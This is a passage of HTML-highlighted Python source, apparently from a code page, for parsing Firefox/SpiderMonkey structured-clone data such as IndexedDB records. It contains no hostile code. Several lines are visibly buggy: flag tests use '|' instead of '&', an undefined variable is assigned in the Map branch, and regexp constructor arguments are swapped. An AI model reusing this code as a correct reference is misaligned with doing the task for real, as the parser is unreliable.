class="built_in">super</span>().__getitem__(self.key_to_hashable(key))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__iter__</span>(<span class="params">self</span>) -&gt; typing.Iterator[<span class="built_in">object</span>]:</span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">super</span>().__iter__():</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">isinstance</span>(key, _HashableContainer):</span><br><span class="line">key = key.inner</span><br><span class="line"><span class="keyword">yield</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__setitem__</span>(<span class="params">self, key: <span class="built_in">object</span>, value: <span class="built_in">object</span></span>):</span><br><span class="line"><span class="built_in">super</span>().__setitem__(self.key_to_hashable(key), value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JSNumberObj</span>(<span class="title class_ inherited__">float</span>):</span><br><span class="line"><span class="string">&quot;&quot;&quot;Type to represent JavaScript number/float “objects” (vs the primitive type)&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JSRegExpObj</span>:</span><br><span class="line">expr:  <span class="built_in">str</span></span><br><span class="line">flags: <span class="string">&#x27;RegExpFlag&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, expr: <span class="built_in">str</span>, flags: <span class="string">&#x27;RegExpFlag&#x27;</span></span>):</span><br><span class="line">self.expr  = expr</span><br><span class="line">self.flags = flags</span><br><span class="line"></span><br><span class="line"><span class="meta">@classmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">from_re</span>(<span class="params">cls, regex: re.Pattern</span>) -&gt; <span class="string">&#x27;JSRegExpObj&#x27;</span>:</span><br><span class="line">flags = RegExpFlag.GLOBAL</span><br><span class="line"><span class="keyword">if</span> regex.flags | re.DOTALL:</span><br><span class="line"><span class="keyword">pass</span>  <span class="comment"># Not supported in current (2020-01) version of SpiderMonkey</span></span><br><span class="line"><span class="keyword">if</span> regex.flags | re.IGNORECASE:</span><br><span class="line">flags |= RegExpFlag.IGNORE_CASE</span><br><span class="line"><span class="keyword">if</span> regex.flags | re.MULTILINE:</span><br><span class="line">flags |= RegExpFlag.MULTILINE</span><br><span class="line"><span class="keyword">return</span> cls(regex.pattern, flags)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_re</span>(<span class="params">self</span>) -&gt; re.Pattern:</span><br><span class="line">flags = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> self.flags | RegExpFlag.IGNORE_CASE:</span><br><span class="line">flags |= re.IGNORECASE</span><br><span class="line"><span class="keyword">if</span> self.flags | RegExpFlag.GLOBAL:</span><br><span class="line"><span class="keyword">pass</span>  <span class="comment"># Matching type depends on matching function used in Python</span></span><br><span class="line"><span class="keyword">if</span> self.flags | RegExpFlag.MULTILINE:</span><br><span class="line">flags |= re.MULTILINE</span><br><span class="line"><span class="keyword">if</span> self.flags | RegExpFlag.UNICODE:</span><br><span class="line"><span class="keyword">pass</span>  <span class="comment">#XXX</span></span><br><span class="line"><span class="keyword">return</span> re.<span class="built_in">compile</span>(self.expr, flags)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JSSavedFrame</span>:</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">raise</span> NotImplementedError()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JSSetObj</span>:</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">raise</span> NotImplementedError()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JSStringObj</span>(<span class="title class_ inherited__">str</span>):</span><br><span class="line"><span class="string">&quot;&quot;&quot;Type to represent JavaScript string “objects” (vs the primitive type)&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DataType</span>(enum.IntEnum):</span><br><span class="line"><span class="comment"># Special values</span></span><br><span class="line">FLOAT_MAX = <span class="number">0xFFF00000</span></span><br><span class="line">HEADER    = <span class="number">0xFFF10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Basic JavaScript types</span></span><br><span class="line">NULL      = <span class="number">0xFFFF0000</span></span><br><span class="line">UNDEFINED = <span class="number">0xFFFF0001</span></span><br><span class="line">BOOLEAN   = <span class="number">0xFFFF0002</span></span><br><span class="line">INT32     = <span class="number">0xFFFF0003</span></span><br><span class="line">STRING    = <span class="number">0xFFFF0004</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Extended JavaScript types</span></span><br><span class="line">DATE_OBJECT           = <span class="number">0xFFFF0005</span></span><br><span class="line">REGEXP_OBJECT         = <span class="number">0xFFFF0006</span></span><br><span class="line">ARRAY_OBJECT          = <span class="number">0xFFFF0007</span></span><br><span class="line">OBJECT_OBJECT         = <span class="number">0xFFFF0008</span></span><br><span class="line">ARRAY_BUFFER_OBJECT   = <span class="number">0xFFFF0009</span></span><br><span class="line">BOOLEAN_OBJECT        = <span class="number">0xFFFF000A</span></span><br><span class="line">STRING_OBJECT         = <span class="number">0xFFFF000B</span></span><br><span class="line">NUMBER_OBJECT         = <span class="number">0xFFFF000C</span></span><br><span class="line">BACK_REFERENCE_OBJECT = <span class="number">0xFFFF000D</span></span><br><span class="line"><span class="comment">#DO_NOT_USE_1</span></span><br><span class="line"><span class="comment">#DO_NOT_USE_2</span></span><br><span class="line">TYPED_ARRAY_OBJECT    = <span class="number">0xFFFF0010</span></span><br><span class="line">MAP_OBJECT            = <span class="number">0xFFFF0011</span></span><br><span class="line">SET_OBJECT            = <span class="number">0xFFFF0012</span></span><br><span class="line">END_OF_KEYS           = <span class="number">0xFFFF0013</span></span><br><span class="line"><span class="comment">#DO_NOT_USE_3</span></span><br><span class="line">DATA_VIEW_OBJECT      = <span class="number">0xFFFF0015</span></span><br><span class="line">SAVED_FRAME_OBJECT    = <span class="number">0xFFFF0016</span>  <span class="comment"># ?</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Principals ?</span></span><br><span class="line">JSPRINCIPALS      = <span class="number">0xFFFF0017</span></span><br><span class="line">NULL_JSPRINCIPALS = <span class="number">0xFFFF0018</span></span><br><span class="line">RECONSTRUCTED_SAVED_FRAME_PRINCIPALS_IS_SYSTEM     = <span class="number">0xFFFF0019</span></span><br><span class="line">RECONSTRUCTED_SAVED_FRAME_PRINCIPALS_IS_NOT_SYSTEM = <span class="number">0xFFFF001A</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ?</span></span><br><span class="line">SHARED_ARRAY_BUFFER_OBJECT = <span class="number">0xFFFF001B</span></span><br><span class="line">SHARED_WASM_MEMORY_OBJECT  = <span class="number">0xFFFF001C</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arbitrarily sized integers</span></span><br><span class="line">BIGINT        = <span class="number">0xFFFF001D</span></span><br><span class="line">BIGINT_OBJECT = <span class="number">0xFFFF001E</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Older typed arrays</span></span><br><span class="line">TYPED_ARRAY_V1_MIN           = <span class="number">0xFFFF0100</span></span><br><span class="line">TYPED_ARRAY_V1_INT8          = TYPED_ARRAY_V1_MIN + <span class="number">0</span></span><br><span class="line">TYPED_ARRAY_V1_UINT8         = TYPED_ARRAY_V1_MIN + <span class="number">1</span></span><br><span class="line">TYPED_ARRAY_V1_INT16         = TYPED_ARRAY_V1_MIN + <span class="number">2</span></span><br><span class="line">TYPED_ARRAY_V1_UINT16        = TYPED_ARRAY_V1_MIN + <span class="number">3</span></span><br><span class="line">TYPED_ARRAY_V1_INT32         = TYPED_ARRAY_V1_MIN + <span class="number">4</span></span><br><span class="line">TYPED_ARRAY_V1_UINT32        = TYPED_ARRAY_V1_MIN + <span class="number">5</span></span><br><span class="line">TYPED_ARRAY_V1_FLOAT32       = TYPED_ARRAY_V1_MIN + <span class="number">6</span></span><br><span class="line">TYPED_ARRAY_V1_FLOAT64       = TYPED_ARRAY_V1_MIN + <span class="number">7</span></span><br><span class="line">TYPED_ARRAY_V1_UINT8_CLAMPED = TYPED_ARRAY_V1_MIN + <span class="number">8</span></span><br><span class="line">TYPED_ARRAY_V1_MAX           = TYPED_ARRAY_V1_UINT8_CLAMPED</span><br><span class="line"></span><br><span class="line"><span class="comment"># Transfer-only tags (not used for persistent data)</span></span><br><span class="line">TRANSFER_MAP_HEADER              = <span class="number">0xFFFF0200</span></span><br><span class="line">TRANSFER_MAP_PENDING_ENTRY       = <span class="number">0xFFFF0201</span></span><br><span class="line">TRANSFER_MAP_ARRAY_BUFFER        = <span class="number">0xFFFF0202</span></span><br><span class="line">TRANSFER_MAP_STORED_ARRAY_BUFFER = <span class="number">0xFFFF0203</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RegExpFlag</span>(enum.IntFlag):</span><br><span class="line">IGNORE_CASE = <span class="number">0b00001</span></span><br><span class="line">GLOBAL      = <span class="number">0b00010</span></span><br><span class="line">MULTILINE   = <span class="number">0b00100</span></span><br><span class="line">UNICODE     = <span class="number">0b01000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Scope</span>(enum.IntEnum):</span><br><span class="line">SAME_PROCESS                   = <span class="number">1</span></span><br><span class="line">DIFFERENT_PROCESS              = <span class="number">2</span></span><br><span class="line">DIFFERENT_PROCESS_FOR_INDEX_DB = <span class="number">3</span></span><br><span class="line">UNASSIGNED                     = <span class="number">4</span></span><br><span class="line">UNKNOWN_DESTINATION            = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">_Input</span>:</span><br><span class="line">stream: io.BufferedReader</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, stream: io.BufferedReader</span>):</span><br><span class="line">self.stream = stream</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">peek</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">return</span> struct.unpack_from(<span class="string">&quot;&lt;q&quot;</span>, self.stream.peek(<span class="number">8</span>))[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">except</span> struct.error:</span><br><span class="line"><span class="keyword">raise</span> EOFError() <span class="keyword">from</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">peek_pair</span>(<span class="params">self</span>) -&gt; (<span class="built_in">int</span>, <span class="built_in">int</span>):</span><br><span class="line">v = self.peek()</span><br><span class="line"><span class="keyword">return</span> ((v &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xFFFFFFFF</span>, (v &gt;&gt; <span class="number">0</span>) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">drop_padding</span>(<span class="params">self, read_length</span>):</span><br><span class="line">length = <span class="number">8</span> - ((read_length - <span class="number">1</span>) % <span class="number">8</span>) - <span class="number">1</span></span><br><span class="line">result = self.stream.read(length)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(result) &lt; length:</span><br><span class="line"><span class="keyword">raise</span> EOFError()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self, fmt=<span class="string">&quot;q&quot;</span></span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">return</span> struct.unpack(<span class="string">&quot;&lt;&quot;</span> + fmt, self.stream.read(<span class="number">8</span>))[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">except</span> struct.error:</span><br><span class="line"><span class="keyword">raise</span> EOFError() <span class="keyword">from</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_bytes</span>(<span class="params">self, length: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">result = self.stream.read(length)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(result) &lt; length:</span><br><span class="line"><span class="keyword">raise</span> EOFError()</span><br><span class="line">self.drop_padding(length)</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_pair</span>(<span class="params">self</span>) -&gt; (<span class="built_in">int</span>, <span class="built_in">int</span>):</span><br><span class="line">v = self.read()</span><br><span class="line"><span class="keyword">return</span> ((v &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xFFFFFFFF</span>, (v &gt;&gt; <span class="number">0</span>) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_double</span>(<span class="params">self</span>) -&gt; <span class="built_in">float</span>:</span><br><span class="line"><span class="keyword">return</span> self.read(<span class="string">&quot;d&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Reader</span>:</span><br><span class="line">all_objs: typing.<span class="type">List</span>[typing.<span class="type">Union</span>[<span class="built_in">list</span>, <span class="built_in">dict</span>]]</span><br><span class="line">compat:   <span class="built_in">bool</span></span><br><span class="line"><span class="built_in">input</span>:    _Input</span><br><span class="line">objs:     typing.<span class="type">List</span>[typing.<span class="type">Union</span>[<span class="built_in">list</span>, <span class="built_in">dict</span>]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, stream: io.BufferedReader</span>):</span><br><span class="line">self.<span class="built_in">input</span> = _Input(stream)</span><br><span class="line"></span><br><span class="line">self.all_objs = []</span><br><span class="line">self.compat   = <span class="literal">False</span></span><br><span class="line">self.objs     = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self</span>):</span><br><span class="line">self.read_header()</span><br><span class="line">self.read_transfer_map()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Start out by reading in the main object and pushing it onto the &#x27;objs&#x27;</span></span><br><span class="line"><span class="comment"># stack. The data related to this object and its descendants extends</span></span><br><span class="line"><span class="comment"># from here to the SCTAG_END_OF_KEYS at the end of the stream.</span></span><br><span class="line">add_obj, result = self.start_read()</span><br><span class="line"><span class="keyword">if</span> add_obj:</span><br><span class="line">self.all_objs.append(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Stop when the stack shows that all objects have been read.</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(self.objs) &gt; <span class="number">0</span>:</span><br><span class="line"><span class="comment"># What happens depends on the top obj on the objs stack.</span></span><br><span class="line">obj = self.objs[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">tag, data = self.<span class="built_in">input</span>.peek_pair()</span><br><span class="line"><span class="keyword">if</span> tag == DataType.END_OF_KEYS:</span><br><span class="line"><span class="comment"># Pop the current obj off the stack, since we are done with it</span></span><br><span class="line"><span class="comment"># and its children.</span></span><br><span class="line">self.<span class="built_in">input</span>.read_pair()</span><br><span class="line">self.objs.pop()</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The input stream contains a sequence of &quot;child&quot; values, whose</span></span><br><span class="line"><span class="comment"># interpretation depends on the type of obj. These values can be</span></span><br><span class="line"><span class="comment"># anything.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># startRead() will allocate the (empty) object, but note that when</span></span><br><span class="line"><span class="comment"># startRead() returns, &#x27;key&#x27; is not yet initialized with any of its</span></span><br><span class="line"><span class="comment"># properties. Those will be filled in by returning to the head of</span></span><br><span class="line"><span class="comment"># this loop, processing the first child obj, and continuing until</span></span><br><span class="line"><span class="comment"># all children have been fully created.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Note that this means the ordering in the stream is a little funky</span></span><br><span class="line"><span class="comment"># for things like Map. See the comment above startWrite() for an</span></span><br><span class="line"><span class="comment"># example.</span></span><br><span class="line">add_obj, key = self.start_read()</span><br><span class="line"><span class="keyword">if</span> add_obj:</span><br><span class="line">self.all_objs.append(key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Backwards compatibility: Null formerly indicated the end of</span></span><br><span class="line"><span class="comment"># object properties.</span></span><br><span class="line"><span class="keyword">if</span> key <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(obj, (JSMapObj, JSSetObj, JSSavedFrame)):</span><br><span class="line">self.objs.pop()</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set object: the values between obj header (from startRead()) and</span></span><br><span class="line"><span class="comment"># DataType.END_OF_KEYS are interpreted as values to add to the set.</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">isinstance</span>(obj, JSSetObj):</span><br><span class="line">obj.add(key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">isinstance</span>(obj, JSSavedFrame):</span><br><span class="line"><span class="keyword">raise</span> NotImplementedError()  <span class="comment">#<span class="doctag">XXX:</span> TODO</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Everything else uses a series of key, value, key, value, … objects.</span></span><br><span class="line">add_obj, val = self.start_read()</span><br><span class="line"><span class="keyword">if</span> add_obj:</span><br><span class="line">self.all_objs.append(val)</span><br><span class="line"></span><br><span class="line"><span class="comment"># For a Map, store those &lt;key,value&gt; pairs in the contained map</span></span><br><span class="line"><span class="comment"># data structure.</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">isinstance</span>(obj, JSMapObj):</span><br><span class="line">obj[key] = value</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(key, (<span class="built_in">str</span>, <span class="built_in">int</span>)):</span><br><span class="line"><span class="comment">#continue</span></span><br><span class="line"><span class="keyword">raise</span> ParseError(<span class="string">&quot;JavaScript object key must be a string or integer&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">isinstance</span>(obj, <span class="built_in">list</span>):</span><br><span class="line"><span class="comment"># Ignore object properties on array</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(key, <span class="built_in">int</span>) <span class="keyword">or</span> key &lt; <span class="number">0</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Extend list with extra slots if needed</span></span><br><span class="line"><span class="keyword">while</span> key &gt;= <span class="built_in">len</span>(obj):</span><br><span class="line">obj.append(<span class="literal">NotImplemented</span>)</span><br><span class="line"></span><br><span class="line">obj[key] = val</span><br><span class="line"></span><br><span class="line">self.all_objs.clear()</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_header</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">tag, data = self.<span class="built_in">input</span>.peek_pair()</span><br><span class="line"></span><br><span class="line">scope: <span class="built_in">int</span></span><br><span class="line"><span class="keyword">if</span> tag == DataType.HEADER:</span><br><span class="line">tag, data = self.<span class="built_in">input</span>.read_pair()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> data == <span class="number">0</span>:</span><br><span class="line">data = <span class="built_in">int</span>(Scope.SAME_PROCESS)</span><br><span class="line"></span><br><span class="line">scope = data</span><br><span class="line"><span class="keyword">else</span>:  <span class="comment"># Old on-disk format</span></span><br><span class="line">scope = <span class="built_in">int</span>(Scope.DIFFERENT_PROCESS_FOR_INDEX_DB)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> scope == Scope.DIFFERENT_PROCESS:</span><br><span class="line">self.compat = <span class="literal">False</span></span><br><span class="line"><span class="keyword">elif</span> scope == Scope.DIFFERENT_PROCESS_FOR_INDEX_DB:</span><br><span class="line">self.compat = <span class="literal">True</span></span><br><span class="line"><span class="keyword">elif</span> scope == Scope.SAME_PROCESS:</span><br><span class="line"><span class="keyword">raise</span> InvalidHeaderError(<span class="string">&quot;Can only parse persistent data&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">raise</span> InvalidHeaderError(<span class="string">&quot;Invalid scope&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_transfer_map</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">tag, data = self.<span class="built_in">input</span>.peek_pair()</span><br><span class="line"><span class="keyword">if</span> tag == DataType.TRANSFER_MAP_HEADER:</span><br><span class="line"><span class="keyword">raise</span> InvalidHeaderError(<span class="string">&quot;Transfer maps are not allowed for persistent data&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_bigint</span>(<span class="params">self, info: <span class="built_in">int</span></span>) -&gt; JSBigInt:</span><br><span class="line">length   = info &amp; <span class="number">0x7FFFFFFF</span></span><br><span class="line">negative = <span class="built_in">bool</span>(info &amp; <span class="number">0x80000000</span>)</span><br><span class="line"><span class="keyword">raise</span> NotImplementedError()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_string</span>(<span class="params">self, info: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">length = info &amp; <span class="number">0x7FFFFFFF</span></span><br><span class="line">latin1 = <span class="built_in">bool</span>(info &amp; <span class="number">0x80000000</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> latin1:</span><br><span class="line"><span class="keyword">return</span> self.<span class="built_in">input</span>.read_bytes(length).decode(<span class="string">&quot;latin-1&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> self.<span class="built_in">input</span>.read_bytes(length * <span class="number">2</span>).decode(<span class="string">&quot;utf-16le&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_read</span>(<span class="params">self</span>):</span><br><span class="line">tag, data = self.<span class="built_in">input</span>.read_pair()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> tag == DataType.NULL:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.UNDEFINED:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">NotImplemented</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.INT32:</span><br><span class="line"><span class="keyword">if</span> data &gt; <span class="number">0x7FFFFFFF</span>:</span><br><span class="line">data -= <span class="number">0x80000000</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span>, JSInt32(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.BOOLEAN:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span>, <span class="built_in">bool</span>(data)</span><br><span class="line"><span class="keyword">elif</span> tag == DataType.BOOLEAN_OBJECT:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, JSBooleanObj(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.STRING:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span>, self.read_string(data)</span><br><span class="line"><span class="keyword">elif</span> tag == DataType.STRING_OBJECT:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, JSStringObj(self.read_string(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.NUMBER_OBJECT:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, JSNumberObj(self.<span class="built_in">input</span>.read_double())</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.BIGINT:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span>, self.read_bigint()</span><br><span class="line"><span class="keyword">elif</span> tag == DataType.BIGINT_OBJECT:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, JSBigIntObj(self.read_bigint())</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.DATE_OBJECT:</span><br><span class="line"><span class="comment"># These timestamps are always UTC</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, datetime.datetime.fromtimestamp(self.<span class="built_in">input</span>.read_double(),</span><br><span class="line">                                             datetime.timezone.utc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.REGEXP_OBJECT:</span><br><span class="line">flags = RegExpFlag(data)</span><br><span class="line"></span><br><span class="line">tag2, data2 = self.<span class="built_in">input</span>.read_pair()</span><br><span class="line"><span class="keyword">if</span> tag2 != DataType.STRING:</span><br><span class="line"><span class="comment">#return False, False</span></span><br><span class="line"><span class="keyword">raise</span> ParseError(<span class="string">&quot;RegExp type must be followed by string&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, JSRegExpObj(flags, self.read_string(data2))</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.ARRAY_OBJECT:</span><br><span class="line">obj = []</span><br><span class="line">self.objs.append(obj)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, obj</span><br><span class="line"><span class="keyword">elif</span> tag == DataType.OBJECT_OBJECT:</span><br><span class="line">obj = &#123;&#125;</span><br><span class="line">self.objs.append(obj)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, obj</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.BACK_REFERENCE_OBJECT:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span>, self.all_objs[data]</span><br><span class="line"><span class="keyword">except</span> IndexError:</span><br><span class="line"><span class="comment">#return False, False</span></span><br><span class="line"><span class="keyword">raise</span> ParseError(<span class="string">&quot;Object backreference to non-existing object&quot;</span>) <span class="keyword">from</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.ARRAY_BUFFER_OBJECT:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, self.read_array_buffer(data)  <span class="comment">#<span class="doctag">XXX:</span> TODO</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.SHARED_ARRAY_BUFFER_OBJECT:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, self.read_shared_array_buffer(data)  <span class="comment">#<span class="doctag">XXX:</span> TODO</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.SHARED_WASM_MEMORY_OBJECT:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, self.read_shared_wasm_memory(data)  <span class="comment">#<span class="doctag">XXX:</span> TODO</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.TYPED_ARRAY_OBJECT:</span><br><span class="line">array_type = self.<span class="built_in">input</span>.read()</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span>, self.read_typed_array(array_type, data)  <span class="comment">#<span class="doctag">XXX:</span> TODO</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.DATA_VIEW_OBJECT:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span>, self.read_data_view(data)  <span class="comment">#<span class="doctag">XXX:</span> TODO</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.MAP_OBJECT:</span><br><span class="line">obj = JSMapObj()</span><br><span class="line">self.objs.append(obj)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, obj</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.SET_OBJECT:</span><br><span class="line">obj = JSSetObj()</span><br><span class="line">self.objs.append(obj)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, obj</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.SAVED_FRAME_OBJECT:</span><br><span class="line">obj = self.read_saved_frame(data)  <span class="comment">#<span class="doctag">XXX:</span> TODO</span></span><br><span class="line">self.objs.append(obj)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, obj</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag &lt; <span class="built_in">int</span>(DataType.FLOAT_MAX):</span><br><span class="line"><span class="comment"># Reassemble double floating point value</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span>, struct.unpack(<span class="string">&quot;=d&quot;</span>, struct.pack(<span class="string">&quot;=q&quot;</span>, (tag &lt;&lt; <span class="number">32</span>) | data))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> DataType.TYPED_ARRAY_V1_MIN &lt;= tag &lt;= DataType.TYPED_ARRAY_V1_MAX:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span>, self.read_typed_array(tag - DataType.TYPED_ARRAY_V1_MIN, data)</span><br><span class="line"></span><br><span class="line"><span 